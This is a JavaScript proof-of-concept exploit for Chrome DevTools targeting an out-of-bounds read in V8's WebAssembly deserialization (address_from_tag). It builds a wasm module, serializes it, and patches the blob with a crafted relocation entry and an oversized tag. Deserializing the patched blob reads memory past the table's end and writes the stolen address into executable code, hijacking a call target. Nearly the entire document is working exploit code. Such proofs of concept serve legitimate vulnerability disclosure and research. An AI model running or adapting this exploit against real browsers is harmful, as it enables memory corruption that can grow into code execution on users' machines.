// CWE-129: OOB read in wasm-serialization.cc address_from_tag()
// Browser DevTools console version
//
// Requires: Chrome/Chromium launched with --js-flags="--allow-natives-syntax"
//   e.g.  google-chrome --js-flags="--allow-natives-syntax --no-liftoff"
//         chromium-browser --js-flags="--allow-natives-syntax --no-liftoff"
//
// Paste the entire block into DevTools console and press Enter.
//
// Vulnerability
// -------------
//   src/wasm/wasm-serialization.cc:1140 (CopyAndRelocate):
//     uint32_t tag = GetWasmCalleeTag(rinfo);       // attacker-controlled uint32
//     Address target = ExternalReferenceList::Get().address_from_tag(tag);
//
//   address_from_tag() (wasm-serialization.cc:287):
//     DCHECK_GT(kNumExternalReferences, tag);       // stripped in release
//     return external_reference_by_tag_[tag];       // OOB read in release

(function () {
'use strict';

// ── Minimal wasm: () -> i32.const 42 ──────────────────────────────────────────
const WASM = new Uint8Array([
  0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,  // magic + version
  0x01,0x05, 0x01,0x60, 0x00,0x01,0x7f,       // type: () -> i32
  0x03,0x02, 0x01,0x00,                        // 1 function, type 0
  0x07,0x05, 0x01,0x01, 0x66,0x00,0x00,       // export "f" = func 0
  0x0a,0x06, 0x01,0x04, 0x00,0x41,0x2a,0x0b, // code: i32.const 42, end
]);

// ── Step 1: Compile + warm to TurboFan ────────────────────────────────────────
console.log('[1] Compiling and warming to TurboFan...');
const mod  = new WebAssembly.Module(WASM);
const inst = new WebAssembly.Instance(mod);
for (let i = 0; i < 200000; i++) inst.exports.f();
console.log('    f() = ' + inst.exports.f());

// ── Step 2: Serialize ─────────────────────────────────────────────────────────
// eval() defers parsing of % to runtime so the block pastes without SyntaxError
// even when --allow-natives-syntax is not set.
let blob;
try {
  blob = eval('%SerializeWasmModule(mod)');
} catch (e) {
  if (e instanceof SyntaxError) {
    console.error('[!] %SerializeWasmModule requires --allow-natives-syntax.');
    console.error('    Relaunch Chrome: google-chrome --js-flags="--allow-natives-syntax --no-liftoff"');
    return;
  }
  throw e;
}
if (!blob) { console.error('[!] %SerializeWasmModule returned null'); return; }
const bv = new Uint8Array(blob);
const dv = new DataView(blob);
console.log('[2] Blob: ' + blob.byteLength + 'B');

// ── Step 3: Parse blob structure ──────────────────────────────────────────────
// Layout: global_header(29B) | [ func_header(54B) + code + reloc ] × N
//   func_header+0:  code_kind (uint8; 0x04 = TurboFan)
//   func_header+29: code_size  (uint32 LE)
//   func_header+33: reloc_size (uint32 LE)
//   func_header+53: tier       (uint8; 0x02 = TurboFan/Turboshaft)
//   func_header+54: code_data[code_size] + reloc_data[reloc_size]

const GLOBAL_HDR  = 29;
const f0_abs      = GLOBAL_HDR;
const code_kind   = bv[f0_abs];
const code_size   = dv.getUint32(f0_abs + 29, true);
const reloc_size  = dv.getUint32(f0_abs + 33, true);
const tier        = bv[f0_abs + 53];
const code_start  = f0_abs + 54;
const reloc_start = code_start + code_size;

console.log('[3] func0: code_kind=0x' + code_kind.toString(16) +
            ' tier=0x' + tier.toString(16) +
            ' code_size=' + code_size + ' reloc_size=' + reloc_size);

if (tier !== 0x02) {
  console.error('[!] func0 not TurboFan (tier=0x' + tier.toString(16) +
                '). Relaunch Chrome with --js-flags="--allow-natives-syntax --no-liftoff"');
  return;
}

// ── Step 4: Craft patched blob ────────────────────────────────────────────────
// Inject fake EXTERNAL_REFERENCE reloc entry:
//   reloc in-memory: [pc_delta, mode_byte] = [0x08, 0x2F]
//     mode_byte = (rmode=11 << 2) | kDefaultTag=3 = 0x2F
//     pc_delta  = 8  → iterator advances pc to code[8]
//   Then GetWasmCalleeTag reads code[8..11] as uint32 → OOB_TAG
//   address_from_tag(OOB_TAG) reads external_reference_by_tag_[0x7FFF] (~256KB OOB)

const PC_DELTA          = 8;
const OOB_TAG           = 0x7FFF;   // >> kNumExternalReferences (~1700–3000)
const EXT_REF_MODE_BYTE = (11 << 2) | 3;  // 0x2F
const new_reloc         = new Uint8Array([PC_DELTA, EXT_REF_MODE_BYTE]);

const patched = blob.slice(0);
const pv = new Uint8Array(patched);
const pd = new DataView(patched);

// 4a. Replace reloc bytes with crafted EXTERNAL_REFERENCE entry
for (let i = 0; i < new_reloc.length; i++) pv[reloc_start + i] = new_reloc[i];

// 4b. Write OOB_TAG at code[PC_DELTA] — GetWasmCalleeTag will read this
const tag_abs   = code_start + PC_DELTA;
const orig_word = [...bv.slice(tag_abs, tag_abs + 4)].map(b => b.toString(16).padStart(2,'0')).join(' ');
pd.setUint32(tag_abs, OOB_TAG, true);
const new_word  = [...pv.slice(tag_abs, tag_abs + 4)].map(b => b.toString(16).padStart(2,'0')).join(' ');
console.log('[4] code[' + PC_DELTA + '..+3]: ' + orig_word + ' → ' + new_word +
            '  (OOB_TAG=0x' + OOB_TAG.toString(16) + ')');

// 4c. Update reloc_size field if original was different
if (new_reloc.length !== reloc_size) {
  pd.setUint32(f0_abs + 33, new_reloc.length, true);
  console.log('    reloc_size: ' + reloc_size + ' → ' + new_reloc.length);
}

// ── Step 5: Trigger deserialization ───────────────────────────────────────────
console.log('[5] %DeserializeWasmModule → triggers vulnerable path...');
try {
  const poisoned_mod = eval('%DeserializeWasmModule(patched, WASM)');
  if (poisoned_mod) {
    console.log('%c╔══════════════════════════════════════════════════════════════╗', 'color:red;font-weight:bold');
    console.log('%c║  [RELEASE BUILD] OOB READ + WRITE EXECUTED                  ║', 'color:red;font-weight:bold');
    console.log('%c║  external_reference_by_tag_[0x7FFF] read (~256KB past end)  ║', 'color:red;font-weight:bold');
    console.log('%c║  returned .bss Address written to executable code            ║', 'color:red;font-weight:bold');
    console.log('%c╚══════════════════════════════════════════════════════════════╝', 'color:red;font-weight:bold');
    try {
      const pi = new WebAssembly.Instance(poisoned_mod);
      console.log('  poisoned f() = ' + pi.exports.f() +
                  '  (code[8..15] corrupted by OOB .bss Address)');
    } catch (ce) {
      console.log('  [CRASH on call] ' + ce.message +
                  ' — OOB Address installed as call target');
    }
  }
} catch (e) {
  console.log('[EXCEPTION] ' + e.message);
  if (/Check failed|DCHECK|FATAL/.test(e.message)) {
    console.log('%c[DEBUG BUILD] DCHECK_GT(kNumExternalReferences, 0x7FFF) FIRED', 'color:orange;font-weight:bold');
    console.log('  at src/wasm/wasm-serialization.cc:287');
    console.log('  confirms: guard present in debug, absent in release');
  } else {
    console.log('  (crash on OOB read or hijacked call target — release build)');
  }
}

})();
